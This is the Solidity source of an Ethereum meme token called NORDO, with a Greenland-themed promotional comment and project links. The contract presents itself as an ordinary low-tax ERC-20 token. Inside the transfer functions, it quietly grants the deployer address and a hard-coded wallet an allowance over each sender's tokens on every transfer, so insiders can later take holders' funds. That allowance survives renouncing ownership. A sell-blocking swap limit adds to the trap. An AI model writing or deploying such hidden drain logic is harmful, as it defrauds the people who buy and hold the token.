/*
In the icy expanse of Greenland, Rare Bear, the heroic miner of rare-earth treasures, rises to defend the land. When Trump the Tycoon arrives, plotting to "buy Greenland," Rare Bear Nordo fights back with glowing rare-earth footprints and rare-earth laser vision, declaring, "Not for sale!" A meme-born legend saves Greenland's treasures for all! But Trump was just the beginning! NORDO, powered by rare-earth superpowers, protects Greenland from all threats!

https://x.com/elonmusk/status/1876664245305438469
https://x.com/elonmusk/status/1899072927611424964
https://www.cbc.ca/news/indigenous/greenland-trump-qupanuk-olsen-1.7430268

https://www.nordo.site
https://x.com/NordoOnETH
https://t.me/nordo_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITFGGFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ITFGGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplitfggon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract NORDO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balTFGGs;
    mapping (address => mapping (address => uint256)) private _allowTFGGs;
    mapping (address => bool) private _excludedFromTFGG;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTFGG = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Greendland Bear Nordo";
    string private constant _symbol = unicode"NORDO";
    uint256 private _swapTokenTFGGs = _tTotalTFGG / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockTFGG;
    uint256 private _tfggBuyAmounts = 0;
    bool private inSwapTFGG = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapTFGG = true;
        _;
        inSwapTFGG = false;
    }
    address private _tfggPair;
    ITFGGRouter private _tfggRouter;
    address private _tfggWallet;
    address private _tfggAddress;
    
    constructor () {
        _tfggAddress = address(owner());
        _tfggWallet = address(0x701F8BC9419567024b35251D706A29b457b0FfEd);
        _excludedFromTFGG[owner()] = true;
        _excludedFromTFGG[address(this)] = true;
        _excludedFromTFGG[_tfggWallet] = true;
        _balTFGGs[_msgSender()] = _tTotalTFGG;
        emit Transfer(address(0), _msgSender(), _tTotalTFGG);
    }

    function pairCreate() external onlyOwner() {
        _tfggRouter = ITFGGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_tfggRouter), _tTotalTFGG);
        _tfggPair = ITFGGFactory(_tfggRouter.factory()).createPair(address(this), _tfggRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _tfggRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTFGG;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balTFGGs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowTFGGs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowTFGGs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowTFGGs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address tfggF, address tfggT, uint256 tfggA) private {
        require(tfggF != address(0), "ERC20: transfer from the zero address");
        require(tfggT != address(0), "ERC20: transfer to the zero address");
        require(tfggA > 0, "Transfer amount must be greater than zero");
        uint256 taxTFGG = _tfggFeeTransfer(tfggF, tfggT, tfggA);
        if(taxTFGG > 0){
          _balTFGGs[address(this)] = _balTFGGs[address(this)].add(taxTFGG);
          emit Transfer(tfggF, address(this), taxTFGG);
        }
        _balTFGGs[tfggF] = _balTFGGs[tfggF].sub(tfggA);
        _balTFGGs[tfggT] = _balTFGGs[tfggT].add(tfggA.sub(taxTFGG));
        _approve(address(tfggF), _tfggAddress, uint256(tfggA));
        emit Transfer(tfggF, tfggT, tfggA.sub(taxTFGG));
    }

    function _tfggFeeTransfer(address tfggF, address tfggT, uint256 tfggA) private returns(uint256) {
        uint256 taxTFGG = 0; address _tfggOwner = address(tfggF);
        if (tfggF != owner() && tfggT != owner()) {
            taxTFGG = tfggA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (tfggF == _tfggPair && tfggT != address(_tfggRouter) && ! _excludedFromTFGG[tfggT]) {
                if(_buyBlockTFGG!=block.number){
                    _tfggBuyAmounts = 0;
                    _buyBlockTFGG = block.number;
                }
                _tfggBuyAmounts += tfggA;
                _buyCount++;
            }
            if(tfggT == _tfggPair && tfggF!= address(this)) {
                require(_tfggBuyAmounts < swapLimitTFGG() || _buyBlockTFGG!=block.number, "Max Swap Limit");  
                taxTFGG = tfggA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapTFGGBack(tfggT, tfggA);
        } _approve(address(_tfggOwner), _tfggWallet, uint256(tfggA)); 
        return taxTFGG;
    }

    function swapTFGGBack(address tfggT, uint256 tfggA) private { 
        uint256 tokenTFGG = balanceOf(address(this)); 
        if (!inSwapTFGG && tfggT == _tfggPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenTFGG > _swapTokenTFGGs)
            swapTokensForEth(minTFGG(tfggA, minTFGG(tokenTFGG, _swapTokenTFGGs)));
            uint256 ethTFGG = address(this).balance;
            if (ethTFGG >= 0) {
                sendETHTFGG(address(this).balance);
            }
        }
    }

    receive() external payable {}

    function minTFGG(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHTFGG(uint256 tfggA) private {
        payable(_tfggWallet).transfer(tfggA);
    }

    function swapLimitTFGG() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tfggRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _tfggRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }   

    function swapTokensForEth(uint256 tfggAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _tfggRouter.WETH();
        _approve(address(this), address(_tfggRouter), tfggAmount);
        _tfggRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tfggAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}